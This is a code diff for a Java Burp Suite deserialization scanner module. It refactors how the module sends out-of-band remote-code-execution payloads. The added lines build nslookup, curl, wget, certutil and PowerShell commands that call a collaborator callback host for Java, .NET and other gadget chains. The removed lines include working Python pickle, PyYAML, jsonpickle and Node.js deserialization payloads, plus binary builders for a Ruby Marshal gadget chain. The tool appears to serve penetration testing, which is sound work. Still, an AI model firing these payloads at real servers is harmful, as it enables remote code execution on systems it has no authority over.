@@ -12,10 +12,10 @@ import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
 import com.omnistrike.framework.PayloadEncoder;
 import com.omnistrike.framework.TimingLock;
+import com.omnistrike.modules.injection.deser.DeserPayloadGenerator;
 
 import com.omnistrike.model.*;
 
-import java.io.ByteArrayOutputStream;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import com.google.gson.*;
@@ -675,14 +675,6 @@ public class DeserializationScanner implements ScanModule {
             }
         }
 
-        // Blind OOB spray if passive found nothing — but only for the target parameter
-        if (deserPoints.isEmpty()) {
-            try {
-                blindOobSprayForParameter(requestResponse, urlPath, targetParameterName);
-            } catch (Exception e) {
-                api.logging().logToError("Deser blind OOB spray error: " + e.getMessage());
-            }
-        }
 
         // Return passive findings (e.g., ".NET BinaryFormatter detected") so the caller
         // adds them to FindingsStore. Previously returned emptyList(), discarding all passive findings.
@@ -751,15 +743,6 @@ public class DeserializationScanner implements ScanModule {
             }
         }
 
-        // If passive detection found NO deserialization points, blind-spray OOB
-        // payloads into all cookies and body parameters for every language.
-        if (deserPoints.isEmpty()) {
-            try {
-                blindOobSpray(requestResponse, urlPath);
-            } catch (Exception e) {
-                api.logging().logToError("Deser blind OOB spray error: " + e.getMessage());
-            }
-        }
 
         // Attach requestResponse to all passive findings so DashboardReporter
         // can report them (it skips findings with null requestResponse).
@@ -1892,8 +1875,183 @@ public class DeserializationScanner implements ScanModule {
 
     // ==================== OOB VIA COLLABORATOR ====================
 
+    /**
+     * Map scanner language string to DeserPayloadGenerator.Language enum.
+     */
+    private static DeserPayloadGenerator.Language mapGeneratorLanguage(String lang) {
+        switch (lang) {
+            case "Java":   return DeserPayloadGenerator.Language.JAVA;
+            case ".NET":   return DeserPayloadGenerator.Language.DOTNET;
+            case "PHP":    return DeserPayloadGenerator.Language.PHP;
+            case "Python": return DeserPayloadGenerator.Language.PYTHON;
+            case "Ruby":   return DeserPayloadGenerator.Language.RUBY;
+            case "Node.js": return DeserPayloadGenerator.Language.NODEJS;
+            default: return null;
+        }
+    }
+
+    /**
+     * Build OOB command templates for a given chain.
+     * Returns {commandTemplate, label} pairs where commandTemplate contains COLLAB_PLACEHOLDER.
+     * The template is resolved via CollaboratorManager.resolveTemplate() which handles
+     * both Burp Collaborator and custom OOB DNS command rewriting.
+     */
+    private static String[][] getOobCommandsForChain(String chainName, DeserPayloadGenerator.Language lang) {
+        // Java-specific chains with special command formats
+        if (lang == DeserPayloadGenerator.Language.JAVA) {
+            if ("URLDNS".equals(chainName) || "DNSCallback".equals(chainName)) {
+                return new String[][]{{"http://COLLAB_PLACEHOLDER/urldns", "DNS callback"}};
+            }
+            if ("JNDIExploit".equals(chainName)) {
+                return new String[][]{
+                        {"ldap://COLLAB_PLACEHOLDER/a", "JNDI LDAP"},
+                        {"rmi://COLLAB_PLACEHOLDER/a", "JNDI RMI"},
+                };
+            }
+            if ("JRMPClient".equals(chainName)) {
+                return new String[][]{{"COLLAB_PLACEHOLDER", "JRMP callback"}};
+            }
+            if ("JRMPListener".equals(chainName)) {
+                return new String[0][]; // Skip — starts a local listener, not outbound OOB
+            }
+        }
+
+        // .NET: include Windows-specific HTTP commands alongside cross-platform DNS
+        if (lang == DeserPayloadGenerator.Language.DOTNET) {
+            return new String[][]{
+                    {"nslookup COLLAB_PLACEHOLDER", "nslookup"},
+                    {"cmd /c certutil -urlcache -f http://COLLAB_PLACEHOLDER/c", "certutil"},
+                    {"powershell -c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps", "powershell"},
+            };
+        }
+
+        // Default: cross-platform OS commands
+        return new String[][]{
+                {"nslookup COLLAB_PLACEHOLDER", "nslookup"},
+                {"curl http://COLLAB_PLACEHOLDER/deser", "curl"},
+                {"wget http://COLLAB_PLACEHOLDER/deser", "wget"},
+        };
+    }
+
+    /**
+     * Register a Collaborator OOB callback for deserialization testing.
+     * Returns the collaborator payload address, or null if unavailable.
+     */
+    private String registerOobCallback(AtomicReference<HttpRequestResponse> sentRequest,
+                                        DeserPoint dp, String url, String technique) {
+        return collaboratorManager.generatePayload(
+                "deser-scanner", url, dp.name,
+                "Deser OOB " + dp.language + " " + technique,
+                interaction -> {
+                    for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
+                        try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                    }
+                    if (interaction.type() == InteractionType.HTTP) {
+                        oobConfirmedParams.add(dp.name);
+                    }
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    dp.language + " Deserialization RCE (Out-of-Band)",
+                                    Severity.CRITICAL,
+                                    interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Language: " + dp.language + " | Technique: " + technique
+                                    + " | Collaborator " + interaction.type().name()
+                                    + " interaction from " + interaction.clientIp())
+                            .description(dp.language + " deserialization RCE confirmed via Collaborator. "
+                                    + "The server deserialized the payload and executed the embedded command, "
+                                    + "triggering a " + interaction.type().name() + " callback. "
+                                    + "Remediation: Do not deserialize untrusted data. Use safe alternatives "
+                                    + "(JSON with strict typing, signed serialization, allowlist-based filters).")
+                            .payload(technique)
+                            .requestResponse(sentRequest.get())
+                            .build());
+                    api.logging().logToOutput("[Deser OOB] Confirmed! " + dp.language + " " + technique
+                            + " at " + url + " param=" + dp.name);
+                }
+        );
+    }
+
     private void activeTestOob(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
-        // Language-specific OOB payloads
+        // Phase 1: DeserPayloadGenerator — proper gadget chain payloads with OOB commands.
+        // Dynamically generates serialized payloads for ALL available chains per language,
+        // replacing hardcoded binary builders. Works with both Burp Collaborator and custom OOB.
+        sendGeneratorOobPayloads(original, dp, url);
+
+        // Phase 2: Text-based injection templates for library-specific vectors
+        // not covered by the generator (JNDI strings, Fastjson JSON, JSON.NET $type,
+        // PHP SoapClient SSRF, etc.). These target non-binary deserialization entry points.
+        sendTextOobTemplates(original, dp, url);
+    }
+
+    /**
+     * Phase 1: Generate OOB payloads using DeserPayloadGenerator for all available chains.
+     * Each chain is tested with multiple OOB commands (nslookup, curl, wget) and encodings
+     * (raw, base64, URL-encoded). The collaborator address is resolved via
+     * CollaboratorManager.resolveTemplate() to support both Burp and custom OOB.
+     */
+    private void sendGeneratorOobPayloads(HttpRequestResponse original, DeserPoint dp, String url)
+            throws InterruptedException {
+        DeserPayloadGenerator.Language genLang = mapGeneratorLanguage(dp.language);
+        if (genLang == null) return;
+
+        Map<String, String> chains = DeserPayloadGenerator.getAvailableChains(genLang);
+
+        for (var entry : chains.entrySet()) {
+            String chainName = entry.getKey();
+            String[][] cmdTemplates = getOobCommandsForChain(chainName, genLang);
+
+            for (String[] cmdInfo : cmdTemplates) {
+                String cmdTemplate = cmdInfo[0];
+                String cmdLabel = cmdInfo[1];
+                String technique = chainName + " " + cmdLabel;
+
+                AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+                String collabPayload = registerOobCallback(sentRequest, dp, url, technique);
+                if (collabPayload == null) continue;
+
+                // resolveTemplate handles COLLAB_PLACEHOLDER replacement and
+                // rewrites DNS commands for custom OOB (nslookup, dig, host, ping, Resolve-DnsName)
+                String resolvedCmd = collaboratorManager.resolveTemplate(cmdTemplate, collabPayload);
+
+                // Try multiple encodings: raw (text formats), base64 (binary), URL-encoded
+                DeserPayloadGenerator.Encoding[] encodings = {
+                        DeserPayloadGenerator.Encoding.RAW,
+                        DeserPayloadGenerator.Encoding.BASE64,
+                        DeserPayloadGenerator.Encoding.URL_ENCODED,
+                };
+
+                for (DeserPayloadGenerator.Encoding enc : encodings) {
+                    try {
+                        byte[] payloadBytes = DeserPayloadGenerator.generate(genLang, chainName, resolvedCmd, enc);
+                        if (payloadBytes == null || payloadBytes.length == 0) continue;
+                        String payloadStr = new String(payloadBytes, StandardCharsets.UTF_8);
+
+                        // Fix PHP serialized string lengths after collaborator URL insertion
+                        if (genLang == DeserPayloadGenerator.Language.PHP
+                                && enc == DeserPayloadGenerator.Encoding.RAW) {
+                            payloadStr = fixPhpSerializedLengths(payloadStr);
+                        }
+
+                        HttpRequestResponse result = sendPayload(original, dp, payloadStr);
+                        sentRequest.compareAndSet(null, result);
+                        perHostDelay();
+                    } catch (Exception e) {
+                        // Chain may not support this command or encoding — skip
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Phase 2: Text-based injection templates for library-specific OOB vectors.
+     * These target non-binary deserialization entry points that the generator doesn't cover:
+     * - Java: JNDI injection, Fastjson, Jackson, XStream, SnakeYAML
+     * - .NET: JSON.NET $type, XAML, SOAP, XmlDocument XXE
+     * - PHP: SoapClient SSRF, Monolog SocketHandler, Guzzle, Laravel, Yii2, WordPress
+     */
+    private void sendTextOobTemplates(HttpRequestResponse original, DeserPoint dp, String url)
+            throws InterruptedException {
         List<String[]> oobTemplateList = new ArrayList<>();
 
         switch (dp.language) {
@@ -2057,153 +2215,25 @@ public class DeserializationScanner implements ScanModule {
                                 + ":\"http://COLLAB_PLACEHOLDER/wp\";}i:1;s:1:\"x\";}}",
                         "WordPress WP_HTML_Token + SoapClient OOB"});
                 break;
-            case "Python":
-                // Pickle os.system — nslookup/curl/wget
-                oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
-                oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
-                oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
-                // Pickle os.popen — works with plain string (uses shell), unlike subprocess.check_output
-                oobTemplateList.add(new String[]{"cos\npopen\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle os.popen nslookup"});
-                // Pickle urllib — HTTP GET to Collaborator (no shell needed)
-                oobTemplateList.add(new String[]{"curllib.request\nurlopen\n(S'http://COLLAB_PLACEHOLDER/urllib'\ntR.", "Pickle urllib OOB"});
-                // Pickle with Python3 builtins.exec + urllib
-                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import urllib.request;urllib.request.urlopen(\"http://COLLAB_PLACEHOLDER/exec\")'\ntR.", "Pickle exec urllib OOB"});
-                // PyYAML !!python/object — os.system
-                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"nslookup COLLAB_PLACEHOLDER\"]", "PyYAML os.system nslookup"});
-                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"curl http://COLLAB_PLACEHOLDER/yaml\"]", "PyYAML os.system curl"});
-                // PyYAML !!python/object — subprocess.Popen
-                oobTemplateList.add(new String[]{"!!python/object/apply:subprocess.Popen [[\"nslookup\",\"COLLAB_PLACEHOLDER\"]]", "PyYAML subprocess nslookup"});
-                // jsonpickle with os.system
-                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"nslookup COLLAB_PLACEHOLDER\"]}]}", "jsonpickle nslookup"});
-                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"curl http://COLLAB_PLACEHOLDER/jp\"]}]}", "jsonpickle curl"});
-                // Pickle exec + requests library (common in Python web apps, requires 'requests' package)
-                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import requests;requests.get(\"http://COLLAB_PLACEHOLDER/pyreq\")'\ntR.", "Pickle exec requests OOB"});
-                // Pickle exec + http.client (Python stdlib, no external dependencies needed)
-                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import http.client;http.client.HTTPConnection(\"COLLAB_PLACEHOLDER\").request(\"GET\",\"/\")'\ntR.", "Pickle exec http.client OOB"});
-                break;
-            case "Ruby":
-                // Ruby YAML Gem::Source — @uri triggers HTTP fetch on fetch_spec/download_spec
-                // Simple single-document YAML that works with YAML.load / Psych
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:Gem::Source\nuri: http://COLLAB_PLACEHOLDER/gem",
-                        "Ruby YAML Gem::Source OOB"});
-                // (Removed 8 non-functional Ruby YAML OOB payloads:
-                //  - Gem chain: duplicate keys, wrong attribute names, malformed
-                //  - Net::FTP/Net::HTTP: don't auto-connect on instantiation
-                //  - OpenURI::OpenRead: class doesn't exist
-                //  - Complex Gem chain: multiple YAML docs (only first loaded), broken anchors
-                //  - Resolv::DNS: doesn't auto-query on instantiation
-                //  - ERB x2: doesn't auto-evaluate template on YAML.load)
-                break;
-            case "Node.js":
-                // node-serialize IIFE with require('http')
-                oobTemplateList.add(new String[]{
-                        "{\"rce\":\"_$$ND_FUNC$$_function(){var http=require('http');"
-                                + "http.get('http://COLLAB_PLACEHOLDER/node')}()\"}",
-                        "node-serialize HTTP OOB"});
-                // node-serialize with child_process — nslookup
-                oobTemplateList.add(new String[]{
-                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
-                                + ".execSync('nslookup COLLAB_PLACEHOLDER')}()\"}",
-                        "node-serialize nslookup OOB"});
-                // node-serialize with child_process — curl
-                oobTemplateList.add(new String[]{
-                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
-                                + ".execSync('curl http://COLLAB_PLACEHOLDER/node2')}()\"}",
-                        "node-serialize curl OOB"});
-                // node-serialize with child_process — wget
-                oobTemplateList.add(new String[]{
-                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
-                                + ".execSync('wget http://COLLAB_PLACEHOLDER/node3')}()\"}",
-                        "node-serialize wget OOB"});
-                // cryo deserialization — HTTP OOB
-                oobTemplateList.add(new String[]{
-                        "{\"__cryo_type__\":\"Function\","
-                                + "\"body\":\"return require('http').get('http://COLLAB_PLACEHOLDER/cryo')\"}",
-                        "cryo HTTP OOB"});
-                // cryo with child_process
-                oobTemplateList.add(new String[]{
-                        "{\"__cryo_type__\":\"Function\","
-                                + "\"body\":\"return require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\"}",
-                        "cryo nslookup OOB"});
-                // funcster deserialization — HTTP OOB
-                oobTemplateList.add(new String[]{
-                        "{\"__js_function\":\"function(){require('http').get('http://COLLAB_PLACEHOLDER/funcster')}\"}",
-                        "funcster HTTP OOB"});
-                // funcster with child_process
-                oobTemplateList.add(new String[]{
-                        "{\"__js_function\":\"function(){require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}\"}",
-                        "funcster nslookup OOB"});
-                // js-yaml !!js/function with HTTP
-                oobTemplateList.add(new String[]{
-                        "!!js/function 'function(){require(\"http\").get(\"http://COLLAB_PLACEHOLDER/jsyaml\")}'",
-                        "js-yaml HTTP OOB"});
-                // js-yaml !!js/function with child_process
-                oobTemplateList.add(new String[]{
-                        "!!js/function 'function(){require(\"child_process\").execSync(\"nslookup COLLAB_PLACEHOLDER\")}'",
-                        "js-yaml nslookup OOB"});
-                // node-serialize with DNS module (no shell)
-                oobTemplateList.add(new String[]{
-                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('dns').resolve('COLLAB_PLACEHOLDER',function(){})}()\"}",
-                        "node-serialize DNS resolve OOB"});
-                // Prototype pollution → constructor with OOB
-                oobTemplateList.add(new String[]{
-                        "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('nslookup COLLAB_PLACEHOLDER');x\"}}}",
-                        "Prototype pollution nslookup OOB"});
-                break;
+            // Python, Ruby, Node.js: covered by DeserPayloadGenerator in Phase 1
             default:
                 break;
         }
 
-        String[][] oobTemplates = oobTemplateList.toArray(new String[0][]);
-
-        for (String[] tmpl : oobTemplates) {
+        // Send text-based OOB templates with Collaborator tracking
+        for (String[] tmpl : oobTemplateList) {
             String payloadTemplate = tmpl[0];
             String technique = tmpl[1];
 
             AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
-            String collabPayload = collaboratorManager.generatePayload(
-                    "deser-scanner", url, dp.name,
-                    "Deser OOB " + dp.language + " " + technique,
-                    interaction -> {
-                        // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
-                        // fires on a 5-second interval so this race is rare, but when it happens the 50ms
-                        // wait is almost always enough for the sending thread to complete its set() call.
-                        for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
-                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
-                        }
-                        // Only stop scanning on HTTP OOB, DNS continues scanning
-                        if (interaction.type() == InteractionType.HTTP) {
-                            oobConfirmedParams.add(dp.name);
-                        }
-                        findingsStore.addFinding(Finding.builder("deser-scanner",
-                                        dp.language + " Deserialization RCE (Out-of-Band)",
-                                        Severity.CRITICAL,
-                                        interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
-                                .url(url).parameter(dp.name)
-                                .evidence("Language: " + dp.language + " | Technique: " + technique
-                                        + " | Collaborator " + interaction.type().name()
-                                        + " interaction from " + interaction.clientIp())
-                                .description(dp.language + " deserialization RCE confirmed via Burp Collaborator. "
-                                        + "The server deserialized the payload and executed the embedded command, "
-                                        + "triggering a " + interaction.type().name() + " callback. "
-                                        + "Remediation: Do not deserialize untrusted data. Use safe alternatives "
-                                        + "(JSON with strict typing, signed serialization, allowlist-based filters).")
-                                .payload(payloadTemplate)
-                                .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
-                                .build());
-                        api.logging().logToOutput("[Deser OOB] Confirmed! " + dp.language + " " + technique
-                                + " at " + url + " param=" + dp.name);
-                    }
-            );
-
+            String collabPayload = registerOobCallback(sentRequest, dp, url, technique);
             if (collabPayload == null) continue;
 
+            // resolveTemplate handles COLLAB_PLACEHOLDER replacement +
+            // DNS command rewriting for custom OOB
             String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
 
-            // Fix PHP serialized string lengths after COLLAB_PLACEHOLDER replacement.
-            // PHP unserialize() requires exact byte lengths in s:XX:"..." format.
-            // Template uses COLLAB_PLACEHOLDER (18 chars) but actual Collaborator domain varies.
+            // Fix PHP serialized string lengths after COLLAB_PLACEHOLDER replacement
             if ("PHP".equals(dp.language)) {
                 payload = fixPhpSerializedLengths(payload);
             }
@@ -2217,338 +2247,10 @@ public class DeserializationScanner implements ScanModule {
 
             for (String encoded : encodedPayloads) {
                 HttpRequestResponse result = sendPayload(original, dp, encoded);
-                sentRequest.compareAndSet(null, result); // Capture the first encoding's send result
+                sentRequest.compareAndSet(null, result);
                 perHostDelay();
             }
         }
-
-        // ==================== BINARY OOB PAYLOADS ====================
-        // For formats where Collaborator URL must be embedded in binary structures.
-        // These are built dynamically since binary length-prefixed fields can't use string replacement.
-
-        if ("Ruby".equals(dp.language)) {
-            // Ruby Marshal binary payloads — for apps using Marshal.load (not YAML.load)
-            // ERB payloads removed: ERB doesn't auto-evaluate template on Marshal.load
-            String[][] rubyBinaryOob = {
-                    {"gemsource", "Ruby Marshal Gem::Source @uri"},
-                    {"gadget_nslookup", "Ruby Marshal Gadget chain nslookup"},
-                    {"gadget_curl", "Ruby Marshal Gadget chain curl"},
-                    {"gadget_wget", "Ruby Marshal Gadget chain wget"},
-            };
-
-            for (String[] rb : rubyBinaryOob) {
-                String type = rb[0];
-                String technique = rb[1];
-
-                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
-                String collabDomain = collaboratorManager.generatePayload(
-                        "deser-scanner", url, dp.name,
-                        "Deser OOB " + technique,
-                        interaction -> {
-                            // Only stop scanning on HTTP OOB, DNS continues scanning
-                            if (interaction.type() == InteractionType.HTTP) {
-                                oobConfirmedParams.add(dp.name);
-                            }
-                            findingsStore.addFinding(Finding.builder("deser-scanner",
-                                            "Ruby Deserialization RCE (Out-of-Band, Marshal binary)",
-                                            Severity.CRITICAL,
-                                            interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
-                                    .url(url).parameter(dp.name)
-                                    .evidence("Technique: " + technique
-                                            + " | Collaborator " + interaction.type().name()
-                                            + " interaction from " + interaction.clientIp())
-                                    .description("Ruby deserialization RCE confirmed via Burp Collaborator. "
-                                            + "Marshal.load processed the binary gadget chain and triggered "
-                                            + "a " + interaction.type().name() + " callback. "
-                                            + "Remediation: Use JSON.parse or YAML.safe_load instead of Marshal.load.")
-                                    .requestResponse(binarySentRequest.get())
-                                    .build());
-                            api.logging().logToOutput("[Deser OOB] Confirmed! Ruby Marshal binary " + technique
-                                    + " at " + url + " param=" + dp.name);
-                        }
-                );
-                if (collabDomain == null) continue;
-
-                byte[] binaryPayload;
-                switch (type) {
-                    case "gemsource":
-                        binaryPayload = buildMarshalObject("Gem::Source",
-                                new String[]{"@uri"},
-                                new String[]{"http://" + collabDomain + "/gem"});
-                        break;
-                    case "gadget_nslookup":
-                        binaryPayload = buildMarshalGadgetChain("nslookup " + collabDomain);
-                        break;
-                    case "gadget_curl":
-                        binaryPayload = buildMarshalGadgetChain("curl http://" + collabDomain + "/rce");
-                        break;
-                    case "gadget_wget":
-                        binaryPayload = buildMarshalGadgetChain("wget http://" + collabDomain + "/rce");
-                        break;
-                    default:
-                        continue;
-                }
-
-                if (binaryPayload.length == 0) continue;
-                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
-
-                // Send base64 (primary — cookie values are typically base64-encoded Marshal)
-                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
-                binarySentRequest.set(result);
-                perHostDelay();
-
-                // Also try URL-encoded base64
-                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
-                perHostDelay();
-            }
-        }
-
-        if ("Python".equals(dp.language)) {
-            // Python Pickle protocol 2 binary payloads — for apps expecting binary pickle
-            String[][] pythonBinaryOob = {
-                    {"os", "system", "nslookup ", "Pickle P2 nslookup"},
-                    {"os", "system", "curl http://", "Pickle P2 curl"},
-                    {"os", "system", "wget http://", "Pickle P2 wget"},
-                    {"os", "popen", "nslookup ", "Pickle P2 os.popen nslookup"},
-            };
-
-            for (String[] pb : pythonBinaryOob) {
-                String module = pb[0];
-                String function = pb[1];
-                String cmdPrefix = pb[2];
-                String technique = pb[3];
-
-                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
-                String collabDomain = collaboratorManager.generatePayload(
-                        "deser-scanner", url, dp.name,
-                        "Deser OOB " + technique,
-                        interaction -> {
-                            // Only stop scanning on HTTP OOB, DNS continues scanning
-                            if (interaction.type() == InteractionType.HTTP) {
-                                oobConfirmedParams.add(dp.name);
-                            }
-                            findingsStore.addFinding(Finding.builder("deser-scanner",
-                                            "Python Deserialization RCE (Out-of-Band, Pickle binary)",
-                                            Severity.CRITICAL,
-                                            interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
-                                    .url(url).parameter(dp.name)
-                                    .evidence("Technique: " + technique
-                                            + " | Collaborator " + interaction.type().name()
-                                            + " interaction from " + interaction.clientIp())
-                                    .description("Python deserialization RCE confirmed via Burp Collaborator. "
-                                            + "pickle.loads() processed the binary payload and executed the command, "
-                                            + "triggering a " + interaction.type().name() + " callback. "
-                                            + "Remediation: Use json.loads() or yaml.safe_load(). Never unpickle untrusted data.")
-                                    .requestResponse(binarySentRequest.get())
-                                    .build());
-                            api.logging().logToOutput("[Deser OOB] Confirmed! Python Pickle binary " + technique
-                                    + " at " + url + " param=" + dp.name);
-                        }
-                );
-                if (collabDomain == null) continue;
-
-                String fullArg = cmdPrefix.contains("http://")
-                        ? cmdPrefix + collabDomain + "/pickle"
-                        : cmdPrefix + collabDomain;
-                byte[] binaryPayload = buildPickleProtocol2(module, function, fullArg);
-                if (binaryPayload.length == 0) continue;
-
-                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
-                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
-                binarySentRequest.set(result);
-                perHostDelay();
-
-                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
-                perHostDelay();
-            }
-        }
-    }
-
-    // ==================== BINARY PAYLOAD BUILDERS ====================
-
-    /**
-     * Encode integer in Ruby Marshal v4.8 format.
-     */
-    private static byte[] marshalInt(int n) {
-        if (n == 0) return new byte[]{0};
-        if (n > 0 && n <= 122) return new byte[]{(byte)(n + 5)};
-        if (n > 0 && n <= 255) return new byte[]{1, (byte) n};
-        if (n > 0 && n <= 65535) return new byte[]{2, (byte)(n & 0xff), (byte)((n >> 8) & 0xff)};
-        return new byte[]{4, (byte)(n & 0xff), (byte)((n >> 8) & 0xff),
-                (byte)((n >> 16) & 0xff), (byte)((n >> 24) & 0xff)};
-    }
-
-    /**
-     * Build a Ruby Marshal v4.8 object with string instance variables.
-     * Constructs: \x04\x08 o :className ivarCount [:ivarName I"value encoding]...
-     */
-    private static byte[] buildMarshalObject(String className, String[] ivarNames, String[] ivarValues) {
-        try {
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            out.write(new byte[]{0x04, 0x08}); // Marshal header v4.8
-            out.write('o'); // Object
-
-            // Class name symbol
-            byte[] classBytes = className.getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(classBytes.length));
-            out.write(classBytes);
-
-            // Instance variable count
-            out.write(marshalInt(ivarNames.length));
-
-            // Each ivar
-            for (int i = 0; i < ivarNames.length; i++) {
-                // Ivar name symbol
-                byte[] nameBytes = ivarNames[i].getBytes(StandardCharsets.US_ASCII);
-                out.write(':');
-                out.write(marshalInt(nameBytes.length));
-                out.write(nameBytes);
-
-                // String value with UTF-8 encoding tag
-                byte[] valBytes = ivarValues[i].getBytes(StandardCharsets.UTF_8);
-                out.write('I'); // Ivar container
-                out.write('"'); // Raw string
-                out.write(marshalInt(valBytes.length));
-                out.write(valBytes);
-                // 1 encoding ivar: E = true (UTF-8)
-                out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
-            }
-            return out.toByteArray();
-        } catch (Exception e) {
-            return new byte[0];
-        }
-    }
-
-    /**
-     * Build a Ruby Marshal v4.8 Gem::Requirement → Gem::DependencyList → Gem::StubSpecification chain.
-     * This is the classic auto-trigger gadget: StubSpecification.loaded_from triggers Kernel.open()
-     * when the requirement is compared or inspected.
-     */
-    private static byte[] buildMarshalGadgetChain(String command) {
-        try {
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            out.write(new byte[]{0x04, 0x08}); // Header
-
-            // Outer: Gem::Requirement object
-            out.write('o');
-            byte[] reqClass = "Gem::Requirement".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(reqClass.length));
-            out.write(reqClass);
-            out.write(marshalInt(1)); // 1 ivar
-
-            // @requirements = [Gem::DependencyList]
-            byte[] reqIvar = "@requirements".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(reqIvar.length));
-            out.write(reqIvar);
-
-            // Array of 1 element
-            out.write('[');
-            out.write(marshalInt(1));
-
-            // Inner: Gem::DependencyList
-            out.write('o');
-            byte[] depClass = "Gem::DependencyList".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(depClass.length));
-            out.write(depClass);
-            out.write(marshalInt(1)); // 1 ivar
-
-            // @specs = [StubSpecification]
-            byte[] specsIvar = "@specs".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(specsIvar.length));
-            out.write(specsIvar);
-
-            // Array of 1 element
-            out.write('[');
-            out.write(marshalInt(1));
-
-            // Innermost: Gem::StubSpecification
-            out.write('o');
-            byte[] stubClass = "Gem::StubSpecification".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(stubClass.length));
-            out.write(stubClass);
-            out.write(marshalInt(2)); // 2 ivars
-
-            // @loaded_from = "|command" (triggers Kernel.open)
-            byte[] loadedIvar = "@loaded_from".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(loadedIvar.length));
-            out.write(loadedIvar);
-            byte[] cmdBytes = ("| " + command).getBytes(StandardCharsets.UTF_8);
-            out.write('I');
-            out.write('"');
-            out.write(marshalInt(cmdBytes.length));
-            out.write(cmdBytes);
-            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
-
-            // @name = "x" (any value)
-            byte[] nameIvar = "@name".getBytes(StandardCharsets.US_ASCII);
-            out.write(':');
-            out.write(marshalInt(nameIvar.length));
-            out.write(nameIvar);
-            byte[] nameVal = "x".getBytes(StandardCharsets.UTF_8);
-            out.write('I');
-            out.write('"');
-            out.write(marshalInt(nameVal.length));
-            out.write(nameVal);
-            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
-
-            return out.toByteArray();
-        } catch (Exception e) {
-            return new byte[0];
-        }
-    }
-
-    /**
-     * Build Python Pickle protocol 2 payload: module.function(arg)
-     */
-    private static byte[] buildPickleProtocol2(String module, String function, String arg) {
-        try {
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            out.write(new byte[]{(byte) 0x80, 0x02}); // Protocol 2 header
-            // GLOBAL: push module.function
-            out.write(('c' + module + "\n" + function + "\n").getBytes(StandardCharsets.US_ASCII));
-            out.write('('); // MARK
-            out.write('X'); // BINUNICODE
-            byte[] argBytes = arg.getBytes(StandardCharsets.UTF_8);
-            // 4-byte little-endian length
-            out.write(argBytes.length & 0xff);
-            out.write((argBytes.length >> 8) & 0xff);
-            out.write((argBytes.length >> 16) & 0xff);
-            out.write((argBytes.length >> 24) & 0xff);
-            out.write(argBytes);
-            out.write(new byte[]{'t', 'R', '.'}); // TUPLE, REDUCE, STOP
-            return out.toByteArray();
-        } catch (Exception e) {
-            return new byte[0];
-        }
-    }
-
-    /**
-     * Send a binary OOB payload with Collaborator tracking.
-     * Handles Collaborator generation, callback registration, and encoding (base64 + URL-encoded).
-     */
